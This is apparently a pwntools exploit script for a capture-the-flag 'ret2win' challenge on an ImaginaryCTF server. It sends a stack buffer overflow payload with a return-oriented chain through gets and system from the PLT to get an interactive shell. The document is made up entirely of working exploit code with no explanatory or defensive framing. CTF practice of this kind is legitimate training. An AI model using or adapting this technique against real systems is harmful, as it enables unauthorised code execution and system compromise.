from pwn import *

p = remote("ret2win.chal.imaginaryctf.org", 1337)
#elf = ELF("./vuln")
#p = elf.process()
#gdb.attach(p)

# install ROPgadget to use shell script command: ROPgadget --binary chal 

ret = 0x40101a

# take from .plt
gets = 0x401060
system = 0x401050

payload = b"a"*0x48 + p64(ret) + p64(gets) + p64(ret) + p64(system)
p.sendline(payload)
p.interactive()
